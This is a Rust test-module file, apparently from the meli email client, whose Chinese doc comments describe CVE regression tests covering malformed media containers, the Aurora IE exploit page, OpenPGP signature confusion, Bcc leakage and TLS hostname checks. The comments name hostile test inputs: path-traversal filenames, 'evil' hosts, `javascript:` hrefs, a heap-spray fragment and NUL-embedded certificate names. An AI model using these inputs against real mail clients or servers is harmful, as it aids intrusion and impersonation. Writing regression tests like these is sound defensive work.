/// `corpus-*.tiff/.heic/.jpg` 附件）。
///
/// L1 melib 解析出精确的 `multipart/mixed` 附件树（`16 + 其余向量` 个根部件），
/// 全部语料字节在 wire 上逐字在场，四种图片 MIME 归类 `ContentType::Other`、
/// `is_text() == false`，base64 / quoted-printable 部件只做传输编码反转（已知答案
/// `SUkqAA==` → `II*\0`）；L2 图片叶只以元数据条目显示，HTML 引用在 [`sanitize`]
/// 里整体死亡且为不动点，inline `Other` 原样分支惰性；L3 源码扫描锁定
/// `open_mailcap` / `open_attachment` 的 `cmd_buf().is_some()` 前置，路径穿越
/// 文件名经 `sanitize_filename` / `sanitize_filename_component` 不产生目录分量，
/// `l3_workspace_has_no_in_process_image_decoder_dependency` 断言全仓清单无任何
/// 内嵌图片解码依赖（`image` / `tiff` / `libheif` / `jpeg` / `png` / `gif` /
/// `webp` / exif 类 crate 全查）；L4 整封攻击邮件端到端解析 + 渲染纯文本，合法
/// 内容（`LEGITIMATE-MARKER-80`）交付、图片字节 / 引用不出现，诚实
/// `http`/`https`/`mailto` 链接保持可用（sanitize 保留 href、render 脚注可见、
/// 确认门放行）。图片类附件显示 / 开门禁的仓内孪生回归为
/// `meli/src/mail/view/tests.rs` 的
/// `cve_2023_4863_webp_attachments_render_as_metadata_only` 与
/// `cve_2023_4863_open_attachment_requires_explicit_attachment_number`。仓内孪生
/// 改动：无（免疫证明，未触碰生产代码）。
///
/// [`Attachment::decode`]: meli::melib::Attachment::decode
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`cve_2023_41064`]: self::cve_2023_41064
#[cfg(test)]
#[path = "CVE-2023-41064.rs"]
mod cve_2023_41064;

/// CVE-2026-8091（Firefox / Thunderbird 150；CVSS 9.8；MFSA 2026-45 批次；Gecko
/// 引擎共享同一修复）**Audio/Video: Playback 组件边界条件错误（incorrect boundary
/// conditions）→ 任意代码执行** regression（issue #81，表 4 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — e-mail-reachable browser engines）：Gecko
/// 的音视频回放栈在解析 / 解复用媒体容器（MP4 / ISO-BMFF、WebM / Matroska、
/// Ogg、WAV、MP3）时，对容器声明的边界——box / element / chunk / page / frame 的
/// 长度与计数——缺乏一致校验：size=0 延伸到 EOF 的 box、size=1 + 64 位 largesize
/// 的越界声明、采样表里远超实际数据的 entry_count、EBML VINT 越界长度、Ogg
/// segment lacing 与数据失配、RIFF 块长度撒谎、MP3 帧头 bitrate / sampling 花招，
/// 任一即可让解码侧缓冲区边界计算失配并越界读写。攻击面正是**邮件内嵌 HTML5
/// 音视频**：`<video>` / `<audio>` / `<source>` / `<track>` / `<picture>` 及
/// `on*` 事件属性一旦被引擎渲染，media element 就在进程内解复用 / 解码附件字节。
///
/// meli 等价面映射（issue #81 明确要求）：meli 是终端邮件客户端，**没有浏览器
/// 引擎、没有 DOM / JS / media element、也没有任何内嵌音视频解码器 / 解复用器**。
/// 本 CVE 的触发原语在结构上不存在。`video/mp4` / `video/webm` / `audio/ogg` /
/// `audio/webm` / `audio/mpeg` / `audio/wav` / `audio/x-wav` 与伪装成
/// `application/octet-stream` 的媒体部件在 melib 解析路径按 Content-Type 归为
/// `ContentType::Other { tag }`、`is_text() == false`（不看扩展名），
/// [`Attachment::decode`] 只做 base64 / quoted-printable / 8bit 传输编码反转，
/// 不做任何 ISO-BMFF box / EBML element / Ogg page / RIFF chunk / MPEG frame
/// 结构解释；inline `Other` 原样文本分支只把已到达字节当纯文本；`multipart/related`
/// 的 `<video src="cid:…">` / `<video><source src>` / `<audio controls autoplay>` /
/// `<track>` / `<picture><source srcset>` / `data:video|audio;…` / 远程
/// `https://evil81.example/x.mp4` / `blob:` / `file:` / `onerror`/`onload`/
/// `oncanplay`/`onloadeddata` 在 [`sanitize`]（ammonia 白名单，标签集只有文本 /
/// 结构元素——`video`/`audio`/`source`/`track`/`picture` 一概非白名单；属性白名单
/// 只有 `a` 的 href/title；`url_schemes` 仅 http/https/mailto）里整体死亡；打开
/// 媒体只有 `open_mailcap`（`meli/src/mail/view/envelope.rs:1859`）与
/// `open_attachment`（同文件 `:2030`）两条汇，两者都以 `context.cmd_buf().is_some()`
/// （先输入附件编号）为前置，命中后字节经 `sanitize_filename` 压平路径穿越再落入
/// `<temp_dir>/meli/` 的 `0o600` 随机名临时文件、交给进程外程序。
///
/// [`cve_2026_8091`] 以内嵌「等价结构」畸形媒体语料（真 `ftyp` + `moov`/`mdat`
/// box 树 + `stsz`/`stsc`/`stco` 采样表；真 EBML `1A45DFA3` 头 + `18538067`
/// Segment + Void/Info 元素；真 `OggS` 页头 + segment lacing 表；真
/// `RIFF`/`WAVE`/`fmt `/`data` 块；真 MPEG 帧头 + `ID3` 头，逐族内嵌「声明长度 /
/// 计数远超实际数据」的边界错误形态）逐层锁定为 **免疫证明，未发现缺口，未触碰
/// 生产代码**。语料共 27 个容器向量：MP4 8（moov size=0 到 EOF、size=1 + 64 位
/// largesize=u64::MAX、mdat size=0xFFFFFFFF、stsz sample_count=0xFFFFFFFF、stsc
/// entry_count=0xFFFFFFFF、stco chunk offset 越界、moov 中途截断、ftyp 首盒 size
/// 越界）、WebM 6（EBML 头长度越界、Segment 未知长度、Segment 长度越界、Void 长度
/// 越界、Info 长度失配、长度 VINT 标记后截断）、Ogg 5（version 非 0、lacing 总和
/// 超过数据、page_segments 越界、页头截断、lacing 继续位无后续页）、WAV 4
///（RIFF size 越界、fmt 块长度失配、data 块长度越界、data 头后截断）、MP3 4
///（帧头后截断、bitrate/sampling 失配、ID3v2 syncsafe size 越界、sampling 保留
/// 索引）；投递形态 21（正确申报七种媒体 MIME、伪装 `application/octet-stream` +
/// `.mp4`/`.ogg`/`.webm`/`.mp3`/`.wav` 文件名、base64 / quoted-printable 传输编码、
/// RFC 2231 `filename*=UTF-8''clip81%2Emp4` 与 `filename*0=`/`filename*1=` 分段
/// 拼写、inline vs attachment、双扩展 `clip81.mp4.txt`、`text/plain` 伪装、路径
/// 穿越 `../../evil81.mp4`、`multipart/related` + `<video poster src="cid:…">`、
/// 嵌套 `message/rfc822`）；另有 19 个 HTML5 媒体嵌入向量。所有语料字节均以 8bit
/// 形式逐字上线（固定投递部件 + `corpus-*.mp4/.ogg/.webm/.mp3/.wav` 附件）。
///
/// L1 melib 解析出精确的 `multipart/mixed` 附件树（21 + 其余向量个根部件），全部
/// 语料字节在 wire 上逐字在场，七种媒体 MIME 归类 `ContentType::Other`、
/// `is_text() == false`，base64 / quoted-printable 部件只做传输编码反转（已知答案
/// `T2dnUw==` → `OggS`、`GkXfow==` → EBML 魔数、`//s=` → MPEG 同步字）；L2 媒体
/// 叶只以元数据条目显示，HTML 媒体引用 / `on*` 事件属性在 [`sanitize`] 里整体死亡
/// 且为不动点，inline `Other` 原样分支惰性；L3 源码扫描锁定 `open_mailcap` /
/// `open_attachment` 的 `cmd_buf().is_some()` 前置，路径穿越文件名经
/// `sanitize_filename` / `sanitize_filename_component` 不产生目录分量，
/// `l3_workspace_has_no_in_process_media_decoder_dependency` 断言全仓清单无任何
/// 内嵌音视频解码 / 解复用依赖（ffmpeg / gstreamer / symphonia / rodio / lewton /
/// ogg / vorbis / minimp4 / mp4 / cpal / audiopus 等全查）；L4 整封攻击邮件端到端
/// 解析 + 渲染纯文本，合法内容（`LEGITIMATE-MARKER-81`）交付、媒体字节 / 引用不
/// 出现，诚实 http/https/mailto 链接保持可用（sanitize 保留 href、render 脚注可见、
/// 确认门放行）。媒体类附件显示 / 开门禁的仓内孪生回归沿用
/// `meli/src/mail/view/tests.rs` 的
/// `cve_2023_4863_webp_attachments_render_as_metadata_only` 与
/// `cve_2023_4863_open_attachment_requires_explicit_attachment_number`。仓内孪生
/// 改动：无（免疫证明，未触碰生产代码）。
///
/// [`Attachment::decode`]: meli::melib::Attachment::decode
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`cve_2026_8091`]: self::cve_2026_8091
#[cfg(test)]
#[path = "CVE-2026-8091.rs"]
mod cve_2026_8091;

/// CVE-2010-0249（Internet Explorer 6 / mshtml.dll；CVSS 9.3 v2；NVD）**无效指针
/// 引用（invalid pointer reference）→ 远程代码执行** regression（issue #82）：
/// Operation Aurora（极光行动）——攻击者向 Google、Adobe 等公司员工发送鱼叉邮件，
/// 正文链接指向托管 IE6 漏洞利用页的服务器（在野样本 URL 形如
/// `http://<evil-host>/a.asp?ZhangChen`）。受害者点击后，mshtml.dll 解析特制
/// HTML/JS：脚本创建 / 删除 DOM 元素留下悬空指针，再用
/// `unescape('%u0c0c%u0c0c')` 堆喷射铺到 `0x0C0C0C0C` 并跳入 shellcode。微软以
/// 2010 年 1 月紧急带外补丁 MS10-002 修复。
///
/// meli 等价面映射（issue #82）：meli 是终端邮件客户端，**没有浏览器引擎、JS
/// 引擎、DOM、ActiveX/COM 宿主**，本 CVE 的触发原语在结构上不存在。等价面 =
/// ①链接显示 / 打开路径：linkify（[`ViewOptions::convert`]）只产生显示用 `Link`
/// 值、不发起网络；打开必须是显式用户动作（URL 模式输入链接编号 + `go_to_url`），
/// 非 `http`/`https`/`mailto` 还要过确认对话框
/// （[`is_default_launchable_scheme`]）；Aurora 链接本身是普通 http URL，放行正是
/// 设计内的显式用户动作语义。②渲染路径无预取 / 无自动打开：`sanitize`/`render`
/// 永不发起网络，`url_launcher` 只出现在 `go_to_url` / `List-Unsubscribe` /
/// `List-Archive` 三个用户动作汇点。③利用页字节形态在 [`sanitize`] 里整体死亡：
/// `<script>`（unescape 堆喷射、createElement/removeChild churn、fromCharCode+eval、
/// cid/https src）、`<object classid="CLSID:…">`、`<embed>`、
/// `<iframe src="javascript:…">`、`<meta refresh>`、CSS `expression(...)`、`on*`
/// 事件属性、`javascript:`/`vbscript:`/`data:text/html` href 全部不在 ammonia
/// 白名单。
///
/// [`cve_2010_0249`] 共 19 条 HTML 利用向量 + 14 条投递形态向量（inline
/// `text/html`、attachment + `Aurora82.html`/`.htm`、伪装
/// `application/octet-stream` + `.html`、base64 / quoted-printable、RFC 2231
/// `filename*=UTF-8''Aurora82%2Ehtml` 与 `filename*0=`/`filename*1=` 分段、双扩展
/// `policy82.html.txt`、`text/plain` 伪装、路径穿越 `../../evil82.html`、
/// `multipart/related` + `<script src="cid:…">`、嵌套 `message/rfc822`），整封
/// `multipart/mixed` 攻击邮件经 melib 解析出精确附件树，全部语料字节在 wire 上
/// 逐字在场。
///
/// L1 melib 解析出精确 `multipart/mixed` 附件树（`[0]` multipart/alternative + 11
/// 个投递部件），`text/plain`/`text/html` 归类正确、`is_text()` 正确，base64 /
/// quoted-printable 只做传输编码反转（已知答案 `PHNjcmlwdD4=` → `<script>`、
/// `=3Cscript=3E` → `<script>`）；L2 每条 HTML 向量 / 完整利用页在 [`sanitize`] 里
/// 整体死亡且为不动点，[`render`] 输出纯终端文本，`%u0c0c` / CLSID / createElement
/// 标记不出现；L3 源码扫描锁定 `Command::new(url_launcher)` 只出现在三个用户动作
/// 汇点、`html_render` 无 `url_launcher`/`Command::new`/`reqwest` 引用，
/// `l3_workspace_has_no_js_or_browser_engine_dependency` 断言全仓清单无任何 JS /
/// 浏览器引擎依赖（v8 / deno_core / quickjs / boa / javascriptcore / webkit2gtk /
/// wry / tauri / servo / headless_chrome / chromiumoxide / fantoccini / thirtyfour /
/// webdriver 等全查；ammonia / html5ever 只是 HTML 解析 / 清理器，不执行脚本）；
/// L4 整封攻击邮件端到端解析 + 渲染纯文本，合法内容（`LEGITIMATE-MARKER-82`）交付、
/// 脚本 / 喷射字节不出现，诚实 http/https/mailto 链接保持可用（sanitize 保留 href、
/// render 脚注可见、门禁放行）。仓内孪生回归：`meli/src/mail/view/tests.rs` 的
/// `go_to_url_cancel_does_not_launch` 与
/// `go_to_url_non_default_scheme_requires_confirmation`。仓内孪生改动：无（免疫证明，
/// 未触碰生产代码）。
///
/// [`Attachment::decode`]: meli::melib::Attachment::decode
/// [`sanitize`]: meli::mail::view::html_render::sanitize
/// [`render`]: meli::mail::view::html_render::render
/// [`ViewOptions::convert`]: meli::mail::view::ViewOptions::convert
/// [`is_default_launchable_scheme`]: meli::mail::view::envelope::is_default_launchable_scheme
/// [`cve_2010_0249`]: self::cve_2010_0249
#[cfg(test)]
#[path = "CVE-2010-0249.rs"]
mod cve_2010_0249;

/// CVE-2007-1268（mutt ≤ 1.5.13；NVD 未分配 CVSS 分数）**GnuPG 签名状态
/// 误判** regression（issue #83，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：mutt 没有正确使用 `--status-fd`，
/// 多部分 OpenPGP 邮件里未签名部分的篡改无法被辨别，伪造内容继承了真实
/// 签名的已验证状态。[`cve_2007_1268`] 用一次性 Ed25519 密钥构造**真实
/// 部分签名**攻击邮件（真 detached 签名 over meli 送验字节 + 攻击者伪造
/// 的未签名兄弟部分），分层锁定 meli 的等价面：L1 信任边界
/// （`extract_unverified_signature`：恰好 2 部分 / micalg / protocol /
/// 送验字节逐字节等于被签 part 的 raw，走私与畸形容器一律 fail-closed，
/// cleartext armor 尾部走私不路由）；L2 状态解读 fail-closed
/// （`signatures_into_error`：空签名列表必须是 `Err` —— 本 issue 暴露并
/// 修复的 fail-open 缺口，CLI 后端 JSON `{"signatures":[]}` 旧版会落成
/// `SignedVerified { comment: None }`；任何一条坏状态整体 `BAD
/// signature`）；L3 真实 gpgme 引擎端到端（导入语料公钥：真签名 over
/// 被签字节 → good；篡改内容 / 拼接未签名兄弟字节 → BAD；垃圾 armor →
/// Err）；L4 显示域隔离（`Signed*` 包装节点与 pager notice 只套签名
/// 子树，仓内孪生单测在 `meli/src/mail/view/tests.rs`：
/// `partial_signature_open_scopes_signed_marker_to_signed_part`、
/// `partial_signature_filter_notice_stays_off_the_unsigned_sibling`）。
/// 结论：结构性免疫 + 一个 fail-open 缺口已修复（空签名列表 → `Err`，
/// 与 gpgme 后端一致）。
///
/// [`cve_2007_1268`]: self::cve_2007_1268
#[cfg(test)]
#[path = "CVE-2007-1268.rs"]
mod cve_2007_1268;

/// CVE-2007-1265（KMail ≤ 1.9.5；CVSS v2 7.8；NVD / CIRCL）**GnuPG 签名
/// 状态误判** regression（Gitea issue #119，表 5 协议与加密信任边界，
/// 与 mutt CVE-2007-1268 同族）：KMail 未正确使用 `--status-fd`，多部件
/// OpenPGP 邮件中未签名部分的篡改无法辨别，「签名元数据为空/缺失」的
/// 畸形签名被当作验签成功，可伪造签名邮件内容。
///
/// [`cve_2007_1265`] 的等价面断言分层锁定：L0——meli/melib 二进制不
/// 解析任何 gpg 状态文本（`--status-fd`/`[GNUPG:]`/`GOODSIG` 字面量
/// 扫描；文本解析只在 `contrib/` 外部示例脚本里，裁决以显式 JSON 状态
/// 过界）；L1——拼接在已签名部分之后的未签名正文、走私进签名容器的
/// 未覆盖第二部分、整个缺失的签名 part 与 armor 前后拼接的 unsigned
/// 文本，全部在信任边界死亡或永远拿不到已验证标记；L3——真 gpgme
/// 引擎端到端：真实签名 over 真实被签字节验证通过（控制组），篡改与
/// 拼接一律 `BAD signature`，五种「元数据为空/缺失」畸形签名语料一律
/// `Err`；L4——显示域隔离的 melib 层结构自检（孪生单测在 meli crate）。
///
/// **本 issue 暴露并修复的真实缺口（L2）**：CLI 后端 JSON 契约的签名
/// 条目缺 `status` 字段时，`Recipient` 旧版反序列化把「未上报的状态」
/// 默认成 `Ok(())`——脚本没有（或没能）判定的签名被展示成
/// `good signature by …`，正是 KMail「`--status-fd` 没读到 = 验证通过」
/// 的 fail-open 模式。修复后 wire 契约要求显式状态：`"status": "OK"`
/// 表示显式成功，其它字符串是错误消息，缺失一律 `Err`（fail-closed），
/// `contrib/pgp-cli-backends/gpg/gpg_verify.py` 示例脚本与
/// CVE-2007-1268 语料同步收敛到显式契约。
///
/// [`cve_2007_1265`]: self::cve_2007_1265
#[cfg(test)]
#[path = "CVE-2007-1265.rs"]
mod cve_2007_1265;

/// CVE-2024-49393（mutt 1.14.0–2.2.12 / neomutt ≤ 2024-04-25；CVSS 6.5）**签名未
/// 覆盖 To/Cc 收件人头** regression（issue #84，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：外层 RFC 5322 的 `To`/`Cc` 不在
/// `multipart/signed` 被签 part 内，中间人可把 `eve@mitm.example` 追加进 `Cc`
/// 破坏机密性；NeoMutt 的修复方向是 Memory Hole / protected header fields，
/// 而本仓库完全没有该支持，meli 的等价面是签名验证域（只认被签 part 的 raw）
/// 与信封头显示语义的隔离。[`cve_2024_49393`] 用一次性 Ed25519 密钥
/// `B2611F2F94BD8B4F282E48BCEDC8569B5D2FEE15` 构造**真实签名**机密邮件 + 两个
/// 只改外层头的 MITM 变体，分层锁定：L1 送验字节逐字节等于被签 part raw、头
/// 篡改不改变验证输入、外层头从不进入、走私收件人 part fail-closed；L2
/// `Signed*` 包装只承载自己的被签子树、`Envelope` 的 `To`/`Cc` 始终来自外层头
/// （`signatures_into_error` 的 fail-closed 已由 #83 锁定，不重复）；L3 真实
/// gpgme 端到端（原件与两个头篡改变体验证结果完全一致为 good——签名对 To/Cc
/// 毫无约束力；篡改正文/把 To 塞进被签 part → BAD；垃圾 armor → Err）；L4 显示
/// 域隔离（仓内孪生单测在 `meli/src/mail/view/tests.rs`：
/// `tampered_recipient_headers_keep_signature_notice_on_the_signed_container`、
/// `tampered_recipient_headers_are_read_from_the_outer_envelope`、
/// `signature_notice_and_header_band_have_no_intersection`）。结论：结构性免疫，
/// 未发现显示语义缺口，未触碰生产代码。
///
/// [`cve_2024_49393`]: self::cve_2024_49393
#[cfg(test)]
#[path = "CVE-2024-49393.rs"]
mod cve_2024_49393;

/// CVE-2024-49394（mutt 1.14.0–2.2.12 / neomutt ≤ 2024-04-25；CVSS 5.3）**签名未
/// 覆盖 In-Reply-To/References 线程头** regression（issue #85，表 5 协议信任
/// 边界 of `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD 原文指出外层 `In-Reply-To`
/// 不受密码学签名保护，中间人可复用一封未加密但已签名的邮件冒充原发件人；
/// 本仓库没有 Memory Hole / protected headers，meli 的等价面是**线程构建
/// （`melib/src/thread.rs`）与线程视图显示语义**。[`cve_2024_49394`] 用一次性
/// Ed25519 密钥 `E130F3621F763BCC0D402F929FB76B8416849528` 构造真实签名回复 +
/// 三个只改外层线程头的重放变体，分层锁定：L1 送验字节逐字节等于被签 part
/// raw、四种变体的 `(signed_part, signature)` 完全相同、把 `In-Reply-To` 塞进
/// 被签 part 会改变送验字节；L2 线程归属语义——genuine 挂声明的 x-root，
/// 同 Message-ID 的 V1/V3 重放不能改挂/合并线程组/重复计数/劫持
/// `node.message`，新 Message-ID 的 V2 诚实地成为挂到 y-root 的独立节点，
/// V1 先到则先见者落位（诚实局限已记录）；L3 真实 gpgme 端到端（genuine 与
/// 三个线程头变体验证结果完全一致为 good——签名对线程头毫无约束力；篡改
/// 正文/把 `In-Reply-To` 塞进被签 part → BAD；垃圾 armor → Err）；L4 显示域
/// 隔离（外层线程头解析、被签子树逐字节不变、`Thread`/`ThreadNode` 无签名
/// 字段；仓内孪生单测在 `meli/src/mail/view/thread.rs`：
/// `cve_2024_49394_replayed_signed_reply_stays_in_its_thread`、
/// `cve_2024_49394_thread_headings_carry_no_signature_status`）。结论：**一个
/// 真实缺口已修复**——同 Message-ID 重放触发 `insert` 幂等早退，首见落位
/// 不可变（`melib/src/thread.rs` 的 `insert_internal`）；其余为结构性免疫。
///
/// [`cve_2024_49394`]: self::cve_2024_49394
#[cfg(test)]
#[path = "CVE-2024-49394.rs"]
mod cve_2024_49394;

/// CVE-2024-49395（mutt / neomutt；CVSS 5.3，CWE-1230）**PGP 加密未隐藏收件人
/// key ID，密文可反推 Bcc 收件人** regression（issue #86，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD 原文 *"In mutt and neomutt, PGP
/// encryption does not use the --hidden-recipient mode which may leak the Bcc
/// email header field by inferring from the recipients info."* OpenPGP 为每个
/// 收件人生成 PKESK 包，包体带 8 字节加密子钥 key ID；Bcc 收件人必须在加密集合
/// 里才能解密，但其 key ID 若可见，任一 To/Cc 收件人都能反查身份、推断 Bcc。
///
/// 本仓库勘查确认两个真实缺口并全部修复：
///
/// 1. **缺口 A（核心面）**：`melib/src/gpgme/mod.rs` 的 `Context::encrypt` 只设
///    `NO_ENCRYPT_TO|NO_COMPRESS|ALWAYS_TRUST`，从不设
///    `GPGME_ENCRYPT_THROW_KEYIDS`；修复为 `hidden_recipients==true` 时追加该
///    flag（gpgme 无 per-recipient hidden 选项，全量 `--throw-keyids` 是 mutt
///    `--hidden-recipient` 的最强等价面）。
/// 2. **缺口 B（外层头直泄）**：`Draft::finalise` 保留 `Bcc:` 头，SMTP
///    `mail_transaction` 把含该头的原文发给所有收件人；修复为在解析信封之后、
///    写 DATA/BDAT 之前用 `melib::smtp::strip_bcc_headers` 删除 `Bcc` 头（及折叠
///    续行），RCPT 集合仍含 Bcc（RFC 5322 §3.5）。
///
/// 触发链路：`send_draft_async`（加密分支）→ `draft_has_bcc_recipients` →
/// `encrypt_filter(..., hidden_recipients)` → `PGPBackend::encrypt` →
/// gpgme flags 追加 `GPGME_ENCRYPT_THROW_KEYIDS`。CLI 后端以
/// `HIDDEN_RECIPIENTS=1` 环境变量约定同一语义。
///
/// [`cve_2024_49395`] 用两把一次性收件人密钥（To 子钥
/// `0x09339244E8A5C674`、Bcc 子钥 `0xF64F5EA77C73C35D`）分层锁定：
/// (a) `draft_has_bcc_recipients` 有/无/仅空白三态；
/// (b) `strip_bcc_headers` 后攻击邮件不含任何 `Bcc` 头行、删除行数恰为 Bcc
/// 头+续行、其余字节逐一致，且 `Envelope::from_bytes(原文).bcc()` 非空——信封
/// RCPT 来源在 strip 之前不受影响；
/// (c) 真实 gpgme 端到端——本地 PKESK 解析器证明 `hidden_recipients=false` 时
/// 密文 key ID 集合恰为 To/Bcc 两把子钥（攻击复现），真实发送路径
/// `encrypt_filter(..., true)` 后所有 key ID 全零、不含两把子钥 ID、密文不含
/// `bcc-49395`，且隐藏密文仍能用私钥解出与输入逐字节一致的明文。
/// 结论：**两个真实缺口均已修复**，纯逻辑与真 gpgme 端到端双重回归锁定。
///
/// [`cve_2024_49395`]: self::cve_2024_49395
#[cfg(test)]
#[path = "CVE-2024-49395.rs"]
mod cve_2024_49395;

/// CVE-2009-1390（mutt 1.5.19，OpenSSL/GnuTLS；CWE-295）**TLS 服务端证书链
/// 校验不完整** regression（issue #87，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD 原文指出，mutt 1.5.19 只要证书链中
/// **一张**证书能独立被接受（本身即信任锚，或由信任锚直接签发）就放行整条
/// 连接，未要求叶子到信任锚的整条链逐节有效，中间人可据此伪装可信服务器。
///
/// meli 的 TLS 校验全部委托 `native-tls`（Linux=OpenSSL 系统信任库 + 全链 +
/// 主机名校验）：`melib/src/imap/connection.rs`、`melib/src/nntp/connection.rs`、
/// `melib/src/smtp.rs` 三处 `TlsConnector::builder()` 都是默认校验器，只有账号
/// 配置显式打开 `danger_accept_invalid_certs` 时才追加危险开关；
/// `connector.connect(&path, socket)` 把服务器主机名交给 verifier；JMAP 的 isahc
/// 客户端（`melib/src/jmap/connection.rs`、`melib/src/jmap/eventsource.rs`）三个
/// `danger_*` 同门控；四个账号配置默认全是 `false`。workspace 无 rustls /
/// webpki，也无 `verify_callback`/`SSL_CTX`/`add_root_certificate` 等自定义校验面。
///
/// **为何单元级 mock**：`native-tls`/`openssl` 不是 melib 公开 API，`cve` 依赖
/// 只有 `meli`，issue 约束「不新增 test-only 依赖」，melib 亦无 TLS 服务器实现，
/// 故按 issue 允许的「真实证书语料 + 单元级 mock」做免疫证明。语料是 openssl
/// 离线生成的真实 ECDSA P-256 链：受信根 / 诚实中间 / 诚实叶、攻击者 Rogue CA /
/// 攻击叶、以及与受信根同 Subject DN 不同密钥的 evil twin CA / 伪造 issuer 叶；
/// 三种攻击链 A1=[攻击叶,受信根]、A2=[攻击叶,诚实中间,受信根]、
/// A3=[伪造 issuer 叶,受信根] 由测试内组装。
///
/// [`cve_2009_1390`] 分层锁定：(a) 语料真实性——诚实链 DN 逐级相连、攻击叶 SAN
/// 均为 `imap.victim.example`、A3 叶 issuer TLV 字节级等于受信根 subject TLV 而
/// 三个自签 CA 的 SPKI 互异（DN 可伪造、密钥不可），`openssl verify` 转录逐字
/// 内嵌（诚实链 `OK`；A1/A2 error 20；A3 error 7）；(b) 攻击复现——mutt 式
/// 「任一证书可独立验证即接受」谓词对诚实链与 A1/A2/A3 全部接受，证明攻击原语
/// 成立；(c) 核心断言——整链连通谓词（签名邻接表 + issuer DN TLV 相等）接受诚实
/// 链、拒绝 A1/A2/A3，即「部分可信链被拒绝」；(d) L3 源码 / manifest 扫描锁定
/// 三处 connector 的默认校验器 + 门控 danger + 主机名、账号配置默认 false、
/// 无自定义证书校验面、TLS 栈为 native-tls，以及可直达的
/// [`SmtpSecurity::default`] danger=false。
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**。
///
/// [`cve_2009_1390`]: self::cve_2009_1390
/// [`SmtpSecurity::default`]: meli::melib::smtp::SmtpSecurity
#[cfg(test)]
#[path = "CVE-2009-1390.rs"]
mod cve_2009_1390;

/// CVE-2009-3765（mutt 1.5.19 / 1.5.20，OpenSSL；CWE-310，CVSS v2 6.8）**证书
/// CN 内嵌 NUL 截断主机名比较** regression（issue #88，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD 原文指出 mutt 不正确处理 X.509
/// subject CN 中的 `'\0'`，攻击者可用**合法 CA 签发**的伪造证书 MITM 冒充任意
/// SSL 服务器；同族 CVE-2009-3766 更进一层——mutt（OpenSSL）完全不校验证书
/// CN 与主机名匹配，任意合法签发的证书即可冒充。本回归同时覆盖「链有效但名字
/// 不匹配」（3766 面）与「CN 内嵌 `\0` 截断比较绕过」（3765 面）。
///
/// meli 等价面：issue 指定的 `melib/src/utils/connections.rs` 只是传输层包装
///（`Connection::Tls` 包 `native_tls::TlsStream`，无任何 CN / 主机名逻辑）；
/// 主机名校验策略全在 native-tls（Linux=OpenSSL 的 `X509_check_host` 语义）
/// 内部，入口在三处 `connector.connect(&path, socket)`——
/// `melib/src/imap/connection.rs`（path=`server_conf.server_hostname`）、
/// `melib/src/nntp/connection.rs`、`melib/src/smtp.rs`；三处
/// `TlsConnector::builder()` 都是默认校验器，只有账号配置显式打开
/// `danger_accept_invalid_certs` 时才追加危险开关，全仓无
/// `danger_accept_invalid_hostnames`；JMAP 的 isahc 客户端
///（`melib/src/jmap/connection.rs`、`eventsource.rs`）三个 `danger_*`
///（certs/hosts/revoked）由同一账号开关门控；四个账号配置默认全是 `false`，
/// `SmtpSecurity::default` 亦然。workspace 无 rustls / webpki，也无
/// `X509_check_host`/`verify_callback`/自定义 CN 解析代码。
///
/// **为何单元级 mock**：`native-tls`/`openssl` 不是 melib 公开 API，`cve` 依赖
/// 只有 `meli`，issue 约束「不新增 test-only 依赖」，melib 亦无 TLS 服务器实现，
/// 故按 issue 允许的「真实证书语料 + 单元级 mock」做免疫证明。语料是 openssl
/// 离线生成的真实 ECDSA P-256 证书（受信根 + 四张由它直接真实签名的叶子：
/// L_MATCH 正确基线、A1 名字不匹配、A2 的 CN 内嵌 `\0`、A3 的 SAN dNSName 内嵌
/// `\0` 且 CN 干净），`openssl verify` 转录逐字内嵌（无主机名校验四叶全 `OK`；
/// 带 `-verify_hostname` 时 L_MATCH `OK`、A1/A2/A3 全 `error 62 hostname
/// mismatch`）。
///
/// [`cve_2009_3765`] 分层锁定：(a) 语料真实性——四叶 issuer TLV 逐字节等于受信
/// 根 subject TLV，A2 的 CN 恰为 `imap.victim.example\0.attacker.example`
///（37 字节、无 SAN），A3 的 SAN 内嵌 `\0` 而 CN 干净，SPKI 互异，DER 长度与
/// `asn1parse` NUL 证据命中；(b) 攻击复现——旧 mutt 三面缺陷谓词（完全不比主机
/// 名 / CN 截断到首个 `\0` / SAN 全量比较失败后回退 CN）对 L_MATCH/A1/A2/A3
/// 全部接受；(c) 核心断言——RFC 6125 正确语义只接受 L_MATCH，A1/A2/A3 全拒绝，
/// SAN 在场即权威且内嵌 `\0` 的名字（含参考主机名）永不匹配；(d) L3 源码 /
/// manifest 扫描锁定三处 connector 的默认校验器 + 门控 danger + 主机名、
/// `utils/connections.rs` 仅传输包装、账号配置默认 false、无自定义主机名校验面、
/// TLS 栈为 native-tls，以及可直达的 [`SmtpSecurity::default`] danger=false。
/// 结论：**免疫证明，未发现缺口，未触碰生产代码**。
///
/// [`cve_2009_3765`]: self::cve_2009_3765
/// [`SmtpSecurity::default`]: meli::melib::smtp::SmtpSecurity
#[cfg(test)]
#[path = "CVE-2009-3765.rs"]
mod cve_2009_3765;

/// CVE-2009-3766（mutt 1.5.19 / 1.5.20，OpenSSL；CWE-295 / CWE-310）**TLS 服务器
/// 证书主机名完全不校验** regression（issue #89，表 5 协议信任边界 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md`）：NVD 原文指出 mutt 使用 OpenSSL 时未正确
/// 校验证书 CN 字段，中间人可用**合法 CA 签发**、名字完全无关的证书冒充任意
/// SSL 服务器。它与同族 CVE-2009-3765 的差别是「根本不比」而非「截断后比」；
/// issue #89 指定攻击样例形态为 CN 内嵌 NUL 截断（`good.example\0evil.example`
/// 伪装匹配 `good.example`），并要求「含 NUL 的 CN/SAN 一律判定不匹配、拒绝」，
/// 语料域名 `good.example` / `evil.example` 与 issue #88 完全独立。
///
/// meli 等价面：issue 指定的 `melib/src/utils/connections.rs` 只是传输层包装
